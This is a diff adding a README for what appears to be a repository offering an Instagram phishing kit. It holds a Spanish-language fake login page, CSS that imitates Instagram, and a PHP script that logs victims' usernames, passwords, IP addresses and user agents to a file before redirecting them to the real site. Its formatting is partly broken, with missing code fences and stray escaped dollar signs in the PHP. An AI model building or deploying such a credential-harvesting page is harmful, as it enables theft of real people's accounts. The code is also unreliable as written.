@@ -1,0 +1,132 @@
+# Phishing Page for Instagram
+
+This repository contains a simple phishing page designed to capture Instagram login credentials. It includes HTML, CSS, and PHP files to create a fake login page that resembles the real Instagram login page.
+
+## Files
+
+### `index.html`
+```html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Instagram</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" type="text/css" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
+        </div>
+        <form action="capturar.php" method="post">
+            <input type="text" name="username" placeholder="Teléfono, usuario o correo electrónico" required>
+            <input type="password" name="password" placeholder="Contraseña" required>
+            <button type="submit">Iniciar sesión</button>
+        </form>
+        <div class="links">
+            <a href="#">¿Olvidaste tu contraseña?</a>
+        </div>
+    </div>
+</body>
+</html>
+body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background-color: #FAFAFA;
+    margin: 0;
+    padding: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+}
+
+.container {
+    max-width: 350px;
+    width: 100%;
+    padding: 40px;
+    background-color: white;
+    border: 1px solid #DBDBDB;
+    border-radius: 1px;
+    box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+}
+
+.logo img {
+    width: 175px;
+    margin-bottom: 20px;
+}
+
+form {
+    display: flex;
+    flex-direction: column;
+}
+
+input {
+    margin-bottom: 10px;
+    padding: 12px;
+    font-size: 14px;
+    border: 1px solid #DBDBDB;
+    border-radius: 3px;
+}
+
+button {
+    padding: 12px;
+    font-size: 14px;
+    color: white;
+    background-color: #0095F6;
+    border: none;
+    border-radius: 3px;
+    cursor: pointer;
+}
+
+button:hover {
+    background-color: #0084d4;
+}
+
+.links {
+    margin-top: 20px;
+    text-align: center;
+}
+
+.links a {
+    color: #00376B;
+    text-decoration: none;
+}
+
+.links a:hover {
+    text-decoration: underline;
+}
+<?php
+// Configuración
+\$logFile = 'instagram_capturas.txt';
+\$redirectUrl = 'https://www.instagram.com/accounts/login/';
+
+// Función para limpiar entradas
+function cleanInput(\$data) {
+    return htmlspecialchars(stripslashes(trim(\$data)));
+}
+
+// Obtener y limpiar datos
+$username = cleanInput($_POST['username']);
+$password = cleanInput($_POST['password']);
+$ip = $_SERVER['REMOTE_ADDR'];
+$userAgent = $_SERVER['HTTP_USER_AGENT'];
+\$timestamp = date('Y-m-d H:i:s');
+
+// Formato de entrada
+$logEntry = "[$timestamp] IP: $ip | User-Agent: $userAgent\n";
+$logEntry .= "Usuario: $username | Contraseña: \$password\n";
+\$logEntry .= "----------------------------------------\n";
+
+// Guardar en archivo con permisos de escritura
+if (is_writable(\$logFile)) {
+    file_put_contents(\$logFile, \$logEntry, FILE_APPEND | LOCK_EX);
+} else {
+    error_log("No se puede escribir en el archivo de log: \$logFile");
+}
+
+// Redirigir
+header("Location: \$redirectUrl");
+exit();
+?>
+git clone https://github.com/your-username/phishing-instagram.git
